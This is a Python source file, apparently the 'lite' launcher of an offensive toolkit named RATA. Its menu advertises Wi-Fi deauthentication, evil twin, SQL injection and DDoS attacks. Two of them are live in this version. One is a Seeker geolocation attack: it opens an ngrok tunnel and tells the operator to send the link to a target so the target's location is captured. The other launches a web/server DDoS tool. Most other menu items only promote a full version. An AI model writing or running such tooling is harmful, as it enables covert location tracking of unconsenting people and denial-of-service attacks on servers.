
import os
import sys
import subprocess
import time
import shutil
from ddos_tool import DDoSAttackTool
try:
    import requests
except ImportError:
    print("\033[0;31mError: 'requests' library not found. Please install it using: pip install requests\033[0m")
    sys.exit(1)
try:
    from msvcrt import getch
except ImportError:
    import termios
    import tty
    def getch():
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            return sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

class WifiToolkitLite:
    """
    RATA (Recon & Analysis Toolkit by DLA) - Lite Version
    This version provides access to the Seeker Geolocation attack
    and promotes the full version of the toolkit.
    """
    def __init__(self):
        self.active_processes = []
        self.interface = "wlan0"
        self.ddos_instance = None

    def _log(self, level, message):
        """Simple logging function for DDoSAttackTool."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    @staticmethod
    def _strip_ansi(text):
        """Removes ANSI color codes from text."""
        import re
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    def _run_command(self, command, shell=False, quiet=False):
        """Executes a shell command."""
        try:
            if quiet:
                return subprocess.run(command, shell=shell, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            else:
                return subprocess.run(command, shell=shell, check=True)
        except FileNotFoundError:
            print(f"{RED}Error: Command not found: {command[0]}{NC}")
            return None
        except subprocess.CalledProcessError as e:
            if not quiet and e.returncode != -2:
                print(f"{RED}Error executing command: {' '.join(command)}{NC}")
            return None
        except Exception as e:
            print(f"{RED}An unexpected error occurred: {e}{NC}")
            return None

    def _print_header(self):
        """Prints the script header."""
        os.system('clear')
        art = f"""
{YELLOW}               ██████╗  █████╗ ████████╗ █████╗ 
{YELLOW}               ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
{YELLOW}               ██████╔╝███████║   ██║   ███████║
{YELLOW}               ██╔══██╗██╔══██║   ██║   ██╔══██║
{YELLOW}               ██║  ██║██║  ██║   ██║   ██║  ██║
{YELLOW}               ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
{YELLOW}                      LITE VERSION
"""
        print(art)
        title = "RATA (Recon & Analysis Toolkit by DLA) v2.11.0"
        
        github_url = "https://github.com/jimbon25/WIFI-TOOLKIT"
        saweria_url = "https://saweria.co/dimasla"
        support_text = "Support the project:"
        
        print(f"{BLUE}{'=' * 70}{NC}")
        print(f"{YELLOW}{title.center(70)}{NC}")
        print(f"{BLUE}{github_url.center(70)}{NC}")
        print(f"{YELLOW}{support_text.center(70)}{NC}")
        print(f"{BLUE}{saweria_url.center(70)}{NC}")
        print(f"{BLUE}{'=' * 70}{NC}\n")

    def _show_download_prompt(self):
        """Displays a message prompting the user to download the full version."""
        self._print_header()
        print(f"{YELLOW}======================[ FULL VERSION REQUIRED ]======================{NC}")
        print()
        print(f"  This feature is only available in the full, compiled version of RATA.")
        print(f"  To get access to all attack modules, please download the latest")
        print(f"  release from the official GitHub page.")
        print()
        print(f"  {GREEN}Download Link:{NC}")
        print(f"  {BLUE}https://github.com/jimbon25/WIFI-TOOLKIT/releases/latest{NC}")
        print()
        print(f"{YELLOW}==================================================================={NC}")
        print(f"\n{GREEN}Press any key to return to the main menu...{NC}")
        getch()

    def _check_seeker_dependencies(self):
        """Checks for dependencies required by the Seeker tool."""
        self._print_header()
        print(f"{YELLOW}[*] Checking dependencies for Seeker (php, ssh, ngrok)...{NC}")
        missing_deps = []
        deps_to_check = ['php', 'ssh', 'ngrok']
        
        for dep in deps_to_check:
            if not shutil.which(dep):
                missing_deps.append(dep)
        
        if missing_deps:
            print(f"\n{RED}[!] Missing required dependencies for Seeker: {', '.join(missing_deps)}{NC}")
            print(f"{YELLOW}    Please install them to use this feature.{NC}")
            print(f"{YELLOW}    Example for Debian/Ubuntu: sudo apt update && sudo apt install -y {' '.join(missing_deps)}{NC}")
            print(f"\n{GREEN}Press any key to return to the main menu...{NC}")
            getch()
            return False
        
        print(f"{GREEN}[✔] All Seeker dependencies are installed.{NC}")
        time.sleep(2)
        return True

    def _check_ddos_dependencies(self):
        """Checks for dependencies required by the DDoS tool."""
        self._print_header()
        print(f"{YELLOW}[*] Checking dependencies for Web/Server DDoS Attack (aiohttp, fake-useragent, PyYAML)...{NC}")
        missing_deps = []
        deps_to_check = ['aiohttp', 'fake_useragent', 'yaml'] # Note: yaml is the module name for PyYAML package

        for dep in deps_to_check:
            try:
                __import__(dep)
            except ImportError:
                missing_deps.append(dep)
        
        if missing_deps:
            print(f"\n{RED}[!] Missing required Python dependencies for Web/Server DDoS Attack: {', '.join(missing_deps)}{NC}")
            pip_deps = [dep.replace('yaml', 'PyYAML').replace('fake_useragent', 'fake-useragent') for dep in missing_deps]
            print(f"{YELLOW}    Please install them using: pip install {' '.join(pip_deps)}{NC}")
            print(f"\n{GREEN}Press any key to return to the main menu...{NC}")
            getch()
            return False
        
        print(f"{GREEN}[✔] All Web/Server DDoS Attack dependencies are installed.{NC}")
        time.sleep(2)
        return True

    def run_seeker_attack(self):
        """Initializes and runs the Seeker geolocation attack."""
        if not self._check_seeker_dependencies():
            return

        self._print_header()
        print(f"{YELLOW}[*] Initializing Geolocation Attack (Seeker)...{NC}")

        seeker_script = os.path.join(os.getcwd(), 'seeker', 'seeker.py')
        if not os.path.exists(seeker_script):
            print(f"{RED}[!] Seeker script not found at: {seeker_script}{NC}")
            print(f"{YELLOW}[*] Please make sure the 'seeker' directory is in the project root.{NC}")
            time.sleep(4)
            return

        ngrok_proc = None
        try:
            print(f"{YELLOW}[*] Starting ngrok tunnel for port 8080...{NC}")
            self._run_command(['pkill', '-f', 'ngrok'], quiet=True)
            time.sleep(1)
            
            ngrok_cmd = ['ngrok', 'http', '8080', '--log=stdout']
            ngrok_proc = subprocess.Popen(ngrok_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(ngrok_proc)
            print(f"{YELLOW}[*] Waiting for ngrok to establish a tunnel...{NC}")
            time.sleep(4)

            public_url = None
            try:
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
                response.raise_for_status()
                tunnels = response.json()['tunnels']
                for tunnel in tunnels:
                    if tunnel.get('proto') == 'https':
                        public_url = tunnel.get('public_url')
                        break
                if not public_url:
                    raise ValueError("Could not find an HTTPS tunnel from ngrok API.")
                print(f"{GREEN}[✔] Ngrok tunnel is live!{NC}")
            except (requests.exceptions.RequestException, ValueError, KeyError) as e:
                print(f"{RED}[!] Failed to get ngrok public URL: {e}{NC}")
                public_url = "Failed to retrieve. Check ngrok status manually."

            print(f"\n{BLUE}{'=' * 70}{NC}")
            print(f"{YELLOW}  SEND THIS URL TO THE TARGET: {GREEN}{public_url}{NC}")
            print(f"{BLUE}{'=' * 70}{NC}\n")
            
            print(f"{YELLOW}[*] Starting Seeker. Please follow the on-screen prompts.{NC}")
            print(f"{YELLOW}[*] When you are finished, press Ctrl+C in the Seeker prompt to stop.{NC}")
            time.sleep(4)

            try:
                import termios
                termios.tcflush(sys.stdin, termios.TCIFLUSH)
            except ImportError:
                pass

            seeker_dir = os.path.join(os.getcwd(), 'seeker')
            subprocess.run(['python3', seeker_script], cwd=seeker_dir)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}Main toolkit interrupted. Stopping Seeker attack...{NC}")
        except Exception as e:
            print(f"\n{RED}An error occurred: {e}{NC}")
        finally:
            print(f"\n{YELLOW}[*] Shutting down ngrok and cleaning up...{NC}")
            if ngrok_proc and ngrok_proc.poll() is None:
                ngrok_proc.terminate()
                if ngrok_proc in self.active_processes:
                    self.active_processes.remove(ngrok_proc)
            self._run_command(['pkill', '-f', 'ngrok'], quiet=True)
            print(f"{GREEN}[✔] Seeker attack session finished.{NC}")
            print(f"{GREEN}Press any key to return to the main menu...{NC}")
            getch()

    def run_ddos_attack(self):
        """Initializes and runs the Web/Server DDoS Attack Tool."""
        if not self._check_ddos_dependencies():
            return

        self._print_header()
        print(f"{YELLOW}[*] Initializing Web/Server DDoS Attack Tool...{NC}")
        
        self.ddos_instance = DDoSAttackTool(self._log)
        self.ddos_instance.run()
        
        print(f"{GREEN}Press any key to return to the main menu...{NC}")
        getch()

    def _run_nuclei_scanner(self):
        """Displays download prompt for Nuclei (full version only)."""
        self._show_download_prompt()

    def show_main_menu(self):
        """Displays the main menu and handles user input."""
        while True:
            self._print_header()
            
            print(f"┌{'─' * 58}┐")
            print(f"│{YELLOW}{'Menu'.center(58)}{NC}│")
            print(f"├{'─' * 58}┤")

            menu_options = [
                f"  {BLUE}[1]{NC}  Network Scanning (airodump-ng)",
                f"  {BLUE}[2]{NC}  DoS Attacks (mdk4, aireplay)",
                f"  {BLUE}[3]{NC}  Mass Deauthentication (mdk4)",
                f"  {BLUE}[4]{NC}  Interactive Deauth (aireplay-ng)",
                f"  {BLUE}[5]{NC}  Handshake Capture",
                f"  {BLUE}[6]{NC}  Evil Twin Attack",
                f"  {BLUE}[7]{NC}  SQL Injection (sqlmap)",
                f"  {BLUE}[8]{NC}  Network Mapper (nmap)",
                f"  {BLUE}[9]{NC}  Stealth Mode",
                f"  {BLUE}[10]{NC} Bandwidth Limiter (evillimiter)",
                f"  {YELLOW}[11]{NC} Geolocation Attack (Seeker)",
                f"  {YELLOW}[12]{NC} Web/Server DDoS Attack",
                f"  {BLUE}[13]{NC} Automated Vulnerability Scanner (Nuclei)",
                f"  {RED}[14]{NC} Exit"
            ]
            
            for option in menu_options:
                padding = ' ' * (60 - 2 - len(self._strip_ansi(option)))
                print(f"│{option}{padding}│")
            
            print(f"└{'─' * 58}┘\n") # Bottom border

            print(f"{YELLOW}Enter your choice [1-14] and press Enter:{NC} ", end='')
            choice = input().strip()

            if choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
                self._show_download_prompt()
            elif choice == '11':
                self.run_seeker_attack()
            elif choice == '12':
                self.run_ddos_attack()
            elif choice == '13':
                self._run_nuclei_scanner()
            elif choice == '14':
                print(f"{YELLOW}Exiting... Thank you for using RATA!{NC}")
                break
            else:
                print(f"\n{RED}Invalid option. Please try again.{NC}")
                time.sleep(1)

    def cleanup(self):
        """Cleans up any running processes before exiting."""
        print(f"\n{YELLOW}[*] Cleaning up active processes...{NC}")
        for proc in self.active_processes:
            if proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except (Exception, subprocess.TimeoutExpired):
                    proc.kill()
        print(f"{GREEN}[✔] Cleanup complete.{NC}")

def main():
    """Main function to run the toolkit."""
    if os.geteuid() != 0:
        print(f"{RED}This script must be run as root. Please use 'sudo'.{NC}")
        sys.exit(1)
        
    toolkit = WifiToolkitLite()
    try:
        toolkit.show_main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Operation cancelled by user. Exiting...{NC}")
    finally:
        toolkit.cleanup()
        try:
            import termios
            fd = sys.stdin.fileno()
            termios.tcsetattr(fd, termios.TCSADRAIN, termios.tcgetattr(fd))
        except (ImportError, termios.error):
            pass

if __name__ == "__main__":
    main()
